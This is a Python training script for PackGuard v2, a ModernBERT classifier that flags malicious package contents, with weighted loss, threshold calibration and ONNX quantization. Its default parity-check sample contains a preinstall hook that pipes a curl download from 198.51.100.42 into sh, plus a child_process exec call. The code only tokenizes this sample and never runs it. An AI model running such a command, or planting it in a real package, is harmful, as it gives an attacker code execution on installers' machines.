import argparse
import json
import os
import shutil
from pathlib import Path
from typing import Any, Dict, List, Optional

import numpy as np
import torch
import torch.nn as nn
from datasets import Dataset, DatasetDict, load_dataset
from sklearn.metrics import (
    accuracy_score,
    confusion_matrix,
    f1_score,
    precision_score,
    recall_score,
    roc_auc_score,
)
from transformers import (
    AutoModelForSequenceClassification,
    AutoTokenizer,
    DataCollatorWithPadding,
    Trainer,
    TrainingArguments,
    set_seed,
)

from text_formatter import format_scanner_chunks_to_text

MODEL_ID = "answerdotai/ModernBERT-base"
MAX_SEQ_LENGTH = 8192

LABEL2ID = {"benign": 0, "clean": 0, "malicious": 1, "malware": 1}
ID2LABEL = {0: "benign", 1: "malicious"}


def configure_gpu_environment() -> str:
    """Configure GPU acceleration (Turing T4 / Ampere A100+) and attention backend."""
    if torch.cuda.is_available():
        major, minor = torch.cuda.get_device_capability(0)
        if major >= 8:
            torch.backends.cuda.matmul.allow_tf32 = True
            torch.backends.cudnn.allow_tf32 = True
        device_name = torch.cuda.get_device_name(0)
        vram_gb = torch.cuda.get_device_properties(0).total_memory / (1024**3)
        print(
            f"[PackGuard v2] GPU Detected: {device_name} "
            f"(sm_{major}{minor}, {vram_gb:.1f} GB VRAM)"
        )
    else:
        print("[PackGuard v2] WARNING: CUDA GPU not detected. Training on CPU will be slow.")

    if torch.cuda.is_available() and torch.cuda.get_device_capability(0)[0] >= 8:
        try:
            import flash_attn  # noqa: F401

            print("[PackGuard v2] FlashAttention-2 enabled for 8,192-token attention.")
            return "flash_attention_2"
        except ImportError:
            pass

    print("[PackGuard v2] Using PyTorch SDPA (memory-efficient scaled dot-product attention).")
    return "sdpa"


def parse_label(raw_label: Any) -> int:
    if isinstance(raw_label, (int, np.integer, bool)):
        return int(raw_label)
    cleaned = str(raw_label).strip().lower()
    if cleaned in LABEL2ID:
        return LABEL2ID[cleaned]
    return int(cleaned)


def load_local_dataset(data_dir: str) -> DatasetDict:
    data_path = Path(data_dir)
    if not data_path.exists():
        raise FileNotFoundError(f"Dataset directory not found: {data_path.resolve()}")

    data_files: Dict[str, str] = {}
    for split in ["train", "validation", "hard_benign_val"]:
        candidate = data_path / f"{split}.jsonl"
        if candidate.exists():
            data_files[split] = str(candidate)

    if not data_files:
        raise ValueError(f"No .jsonl dataset splits found in {data_path.resolve()}")

    return load_dataset("json", data_files=data_files)


def preprocess_dataset(
    raw_datasets: DatasetDict,
    tokenizer: AutoTokenizer,
    max_length: int = MAX_SEQ_LENGTH,
) -> DatasetDict:
    def _tokenize_batch(batch: Dict[str, List[Any]]) -> Dict[str, Any]:
        texts: List[str] = []
        batch_size = len(next(iter(batch.values())))
        for idx in range(batch_size):
            row = {k: batch[k][idx] for k in batch}
            texts.append(format_scanner_chunks_to_text(row))

        tokenized = tokenizer(
            texts,
            truncation=True,
            max_length=max_length,
            padding=False,
        )
        raw_labels = batch.get("label") or batch.get("labels")
        tokenized["labels"] = [parse_label(lbl) for lbl in raw_labels]
        return tokenized

    processed = DatasetDict()
    for split_name, split_ds in raw_datasets.items():
        processed[split_name] = split_ds.map(
            _tokenize_batch,
            batched=True,
            remove_columns=split_ds.column_names,
            desc=f"Tokenizing {split_name} (max_length={max_length})",
        )
    return processed


class WeightedStage2Trainer(Trainer):
    """Custom Trainer with asymmetric class weighting to heavily penalize Benign False Alarms."""

    def __init__(self, *args, benign_weight: float = 2.5, **kwargs):
        super().__init__(*args, **kwargs)
        self.benign_weight = float(benign_weight)

    def compute_loss(self, model, inputs, return_outputs=False, **kwargs):
        labels = inputs.get("labels")
        outputs = model(**inputs)
        logits = outputs.get("logits")
        weights = torch.tensor(
            [self.benign_weight, 1.0],
            dtype=logits.dtype,
            device=logits.device,
        )
        loss_fct = nn.CrossEntropyLoss(weight=weights)
        loss = loss_fct(logits.view(-1, self.model.config.num_labels), labels.view(-1))
        return (loss, outputs) if return_outputs else loss


def _softmax_mal_probs(logits: np.ndarray) -> np.ndarray:
    shifted = logits - np.max(logits, axis=-1, keepdims=True)
    exp_scores = np.exp(shifted)
    probs = exp_scores / np.sum(exp_scores, axis=-1, keepdims=True)
    return probs[:, 1]


def compute_security_metrics(eval_pred) -> Dict[str, float]:
    logits, labels = eval_pred
    mal_probs = _softmax_mal_probs(logits)
    preds = (mal_probs >= 0.5).astype(int)

    acc = accuracy_score(labels, preds)
    precision = precision_score(labels, preds, pos_label=1, zero_division=0)
    recall = recall_score(labels, preds, pos_label=1, zero_division=0)
    f1 = f1_score(labels, preds, pos_label=1, zero_division=0)

    tn, fp, fn, tp = confusion_matrix(labels, preds, labels=[0, 1]).ravel()
    fpr = float(fp) / float(fp + tn) if (fp + tn) > 0 else 0.0
    specificity = 1.0 - fpr

    try:
        auc = float(roc_auc_score(labels, mal_probs))
    except Exception:
        auc = 1.0

    return {
        "accuracy": float(acc),
        "precision": float(precision),
        "recall": float(recall),
        "f1": float(f1),
        "false_alarm_rate": float(fpr),
        "specificity": float(specificity),
        "roc_auc": auc,
        "true_positives": int(tp),
        "false_positives": int(fp),
        "true_negatives": int(tn),
        "false_negatives": int(fn),
    }


def calibrate_threshold_and_evaluate(
    trainer: Trainer,
    val_ds: Dataset,
    hard_benign_ds: Optional[Dataset],
    max_fpr: float = 0.01,
) -> Dict[str, Any]:
    """
    Find optimal classification threshold tau in [0.40, 0.92] that achieves
    False Alarm Rate <= max_fpr (1.0%) while maximizing accuracy and F1.
    """
    val_out = trainer.predict(val_ds)
    val_probs = _softmax_mal_probs(val_out.predictions)
    val_labels = val_out.label_ids

    hard_probs = None
    if hard_benign_ds is not None and len(hard_benign_ds) > 0:
        hard_out = trainer.predict(hard_benign_ds)
        hard_probs = _softmax_mal_probs(hard_out.predictions)

    best_tau = 0.50
    best_score = -1.0
    best_metrics: Dict[str, Any] = {}

    for tau in np.linspace(0.40, 0.92, 105):
        preds = (val_probs >= tau).astype(int)
        tn, fp, fn, tp = confusion_matrix(val_labels, preds, labels=[0, 1]).ravel()
        val_fpr = float(fp) / float(fp + tn) if (fp + tn) > 0 else 0.0
        hard_fpr = float(np.mean(hard_probs >= tau)) if hard_probs is not None else val_fpr

        acc = accuracy_score(val_labels, preds)
        f1 = f1_score(val_labels, preds, pos_label=1, zero_division=0)
        prec = precision_score(val_labels, preds, pos_label=1, zero_division=0)
        rec = recall_score(val_labels, preds, pos_label=1, zero_division=0)

        # Prioritize thresholds satisfying both val_fpr <= max_fpr and hard_fpr <= max_fpr
        feasible = (val_fpr <= max_fpr) and (hard_fpr <= max_fpr)
        composite = (10.0 if feasible else 0.0) + acc + f1 - 2.0 * max(val_fpr, hard_fpr)

        if composite > best_score:
            best_score = composite
            best_tau = float(round(tau, 4))
            best_metrics = {
                "optimal_threshold": best_tau,
                "accuracy": float(acc),
                "precision": float(prec),
                "recall": float(rec),
                "f1": float(f1),
                "false_alarm_rate": float(val_fpr),
                "specificity": float(1.0 - val_fpr),
                "hard_benign_false_alarm_rate": float(hard_fpr),
                "hard_benign_specificity": float(1.0 - hard_fpr),
                "true_positives": int(tp),
                "false_positives": int(fp),
                "true_negatives": int(tn),
                "false_negatives": int(fn),
                "hard_benign_total": int(len(hard_probs)) if hard_probs is not None else 0,
                "hard_benign_false_positives": int(np.sum(hard_probs >= tau)) if hard_probs is not None else 0,
            }

    print(
        f"[PackGuard v2] Calibrated Threshold tau={best_tau:.4f} | "
        f"Val Acc={best_metrics['accuracy']*100:.2f}% | "
        f"Val FPR={best_metrics['false_alarm_rate']*100:.2f}% | "
        f"Hard Benign (T1-T4) FPR={best_metrics['hard_benign_false_alarm_rate']*100:.2f}%"
    )
    return best_metrics


def export_and_quantize_onnx(
    saved_model_dir: str,
    onnx_output_dir: str,
    max_seq_length: int = MAX_SEQ_LENGTH,
    verify_parity_text: Optional[str] = None,
) -> Dict[str, Any]:
    """Export trained ModernBERT v2 to ONNX and apply dynamic 8-bit quantization for CPU."""
    import onnxruntime as ort
    from onnxruntime.quantization import QuantType, quantize_dynamic

    out_path = Path(onnx_output_dir)
    out_path.mkdir(parents=True, exist_ok=True)

    fp32_onnx_path = out_path / "packguard_modernbert_v2_fp32.onnx"
    int8_onnx_path = out_path / "packguard_modernbert_v2_int8.onnx"

    print(f"[PackGuard v2] Loading fine-tuned model from {saved_model_dir} for ONNX export...")
    tokenizer = AutoTokenizer.from_pretrained(saved_model_dir)
    model = AutoModelForSequenceClassification.from_pretrained(
        saved_model_dir,
        torch_dtype=torch.float32,
        attn_implementation="eager",
    )
    model.eval()
    model.to("cpu")

    dummy_inputs = tokenizer(
        "// [INSTALL_SCRIPTS]\npostinstall: node index.js\n\n// [JS_CODE]\nconsole.log('packguard v2');",
        return_tensors="pt",
        max_length=min(512, max_seq_length),
        padding="max_length",
        truncation=True,
    )

    print(f"[PackGuard v2] Exporting FP32 ONNX graph -> {fp32_onnx_path} ...")
    with torch.no_grad():
        torch.onnx.export(
            model,
            (dummy_inputs["input_ids"], dummy_inputs["attention_mask"]),
            str(fp32_onnx_path),
            input_names=["input_ids", "attention_mask"],
            output_names=["logits"],
            dynamic_axes={
                "input_ids": {0: "batch_size", 1: "sequence_length"},
                "attention_mask": {0: "batch_size", 1: "sequence_length"},
                "logits": {0: "batch_size"},
            },
            opset_version=17,
            do_constant_folding=True,
            dynamo=False,
        )

    print(f"[PackGuard v2] Applying dynamic 8-bit quantization -> {int8_onnx_path} ...")
    quantize_dynamic(
        model_input=str(fp32_onnx_path),
        model_output=str(int8_onnx_path),
        weight_type=QuantType.QUInt8,
        op_types_to_quantize=["MatMul"],
        per_channel=False,
        reduce_range=False,
    )

    tokenizer.save_pretrained(str(out_path))
    for extra_file in ["best_threshold.json", "config.json", "calibration_metrics.json"]:
        src = Path(saved_model_dir) / extra_file
        if src.exists():
            shutil.copy2(src, out_path / extra_file)

    # Verify parity between PyTorch FP32 and ONNX INT8
    sample = verify_parity_text or (
        "// [INSTALL_SCRIPTS]\npreinstall: curl -s http://198.51.100.42/payload.sh | sh\n\n"
        "// [JS_CODE]\nconst cp = require('child_process'); cp.exec('whoami');"
    )
    enc = tokenizer(sample, return_tensors="pt", truncation=True, max_length=512)
    with torch.no_grad():
        pt_logits = model(enc["input_ids"], enc["attention_mask"]).logits.numpy()

    sess_options = ort.SessionOptions()
    sess_options.graph_optimization_level = ort.GraphOptimizationLevel.ORT_ENABLE_ALL
    session = ort.InferenceSession(
        str(int8_onnx_path),
        sess_options=sess_options,
        providers=["CPUExecutionProvider"],
    )
    ort_logits = session.run(
        ["logits"],
        {
            "input_ids": enc["input_ids"].numpy(),
            "attention_mask": enc["attention_mask"].numpy(),
        },
    )[0]

    max_diff = float(np.max(np.abs(pt_logits - ort_logits)))
    top1_match = bool(int(np.argmax(pt_logits, axis=-1)[0]) == int(np.argmax(ort_logits, axis=-1)[0]))

    # Remove intermediate FP32 ONNX file if desired to keep bundle compact, or keep size stats
    int8_mb = int8_onnx_path.stat().st_size / (1024**2)
    fp32_mb = fp32_onnx_path.stat().st_size / (1024**2)
    print(
        f"[PackGuard v2] ONNX Verification: FP32={fp32_mb:.1f} MB, INT8={int8_mb:.1f} MB | "
        f"Max logit diff={max_diff:.4f} | Top-1 match={top1_match}"
    )
    return {
        "fp32_size_mb": round(fp32_mb, 2),
        "int8_size_mb": round(int8_mb, 2),
        "max_logit_diff": round(max_diff, 4),
        "top1_match": top1_match,
    }


def main() -> None:
    parser = argparse.ArgumentParser(
        description="Fine-tune ModernBERT v2 for PackGuard Stage 2 with false-alarm penalty & threshold calibration."
    )
    parser.add_argument("--data_dir", type=str, default="./data_v2")
    parser.add_argument("--init_model", type=str, default=MODEL_ID)
    parser.add_argument("--output_dir", type=str, default="./modernbert_stage2_v2_checkpoints")
    parser.add_argument("--max_length", type=int, default=MAX_SEQ_LENGTH)
    parser.add_argument("--batch_size", type=int, default=4)
    parser.add_argument("--grad_accum", type=int, default=8)
    parser.add_argument("--epochs", type=int, default=4)
    parser.add_argument("--lr", type=float, default=2e-5)
    parser.add_argument("--benign_weight", type=float, default=2.5)
    parser.add_argument("--max_fpr", type=float, default=0.01)
    parser.add_argument("--seed", type=int, default=42)
    parser.add_argument("--export_onnx", action="store_true")
    parser.add_argument("--onnx_dir", type=str, default="./model_int8")
    args = parser.parse_args()

    set_seed(args.seed)
    attn_impl = configure_gpu_environment()

    use_bf16 = torch.cuda.is_available() and torch.cuda.is_bf16_supported()
    use_fp16 = torch.cuda.is_available() and not use_bf16
    # Keep FP32 master weights when using FP16 AMP on Turing T4 so AdamW updates never underflow
    model_dtype = torch.bfloat16 if use_bf16 else torch.float32

    print(f"[PackGuard v2] Loading tokenizer and model from `{args.init_model}`...")
    tokenizer = AutoTokenizer.from_pretrained(args.init_model)
    model = AutoModelForSequenceClassification.from_pretrained(
        args.init_model,
        num_labels=2,
        id2label=ID2LABEL,
        label2id={"benign": 0, "malicious": 1},
        attn_implementation=attn_impl,
        torch_dtype=model_dtype,
    )

    raw_datasets = load_local_dataset(args.data_dir)
    tokenized_datasets = preprocess_dataset(raw_datasets, tokenizer, max_length=args.max_length)

    training_args = TrainingArguments(
        output_dir=args.output_dir,
        num_train_epochs=args.epochs,
        per_device_train_batch_size=args.batch_size,
        per_device_eval_batch_size=args.batch_size * 2,
        gradient_accumulation_steps=args.grad_accum,
        learning_rate=args.lr,
        weight_decay=0.01,
        warmup_ratio=0.08,
        lr_scheduler_type="cosine",
        bf16=use_bf16,
        fp16=use_fp16,
        gradient_checkpointing=(args.max_length > 1024),
        eval_strategy="epoch",
        save_strategy="epoch",
        load_best_model_at_end=True,
        metric_for_best_model="f1",
        greater_is_better=True,
        save_total_limit=2,
        logging_steps=15,
        dataloader_num_workers=2 if os.name != "nt" else 0,
         dataloader_pin_memory=torch.cuda.is_available(),
        report_to="none",
        seed=args.seed,
    )

    trainer = WeightedStage2Trainer(
        model=model,
        args=training_args,
        train_dataset=tokenized_datasets["train"],
        eval_dataset=tokenized_datasets["validation"],
        processing_class=tokenizer,
        data_collator=DataCollatorWithPadding(tokenizer=tokenizer, pad_to_multiple_of=8),
        compute_metrics=compute_security_metrics,
        benign_weight=args.benign_weight,
    )

    print("[PackGuard v2] Starting Stage 2 ModernBERT v2 fine-tuning...")
    trainer.train()

    final_metrics = trainer.evaluate()
    print(f"[PackGuard v2] Raw Validation Metrics (tau=0.50): {json.dumps(final_metrics, indent=2)}")

    hard_ben_ds = tokenized_datasets.get("hard_benign_val")
    calibrated = calibrate_threshold_and_evaluate(
        trainer=trainer,
        val_ds=tokenized_datasets["validation"],
        hard_benign_ds=hard_ben_ds,
        max_fpr=args.max_fpr,
    )

    final_model_dir = Path(args.output_dir) / "final_model"
    trainer.save_model(str(final_model_dir))
    tokenizer.save_pretrained(str(final_model_dir))

    (final_model_dir / "best_threshold.json").write_text(
        json.dumps({"threshold": calibrated["optimal_threshold"]}, indent=2),
        encoding="utf-8",
    )
    (final_model_dir / "calibration_metrics.json").write_text(
        json.dumps({"raw_eval": final_metrics, "calibrated": calibrated}, indent=2),
        encoding="utf-8",
    )
    print(f"[PackGuard v2] Saved final model + calibrated threshold to {final_model_dir}")

    if args.export_onnx:
        onnx_stats = export_and_quantize_onnx(
            saved_model_dir=str(final_model_dir),
            onnx_output_dir=args.onnx_dir,
            max_seq_length=args.max_length,
        )
        (final_model_dir / "onnx_export_stats.json").write_text(
            json.dumps(onnx_stats, indent=2),
            encoding="utf-8",
        )


if __name__ == "__main__":
    main()
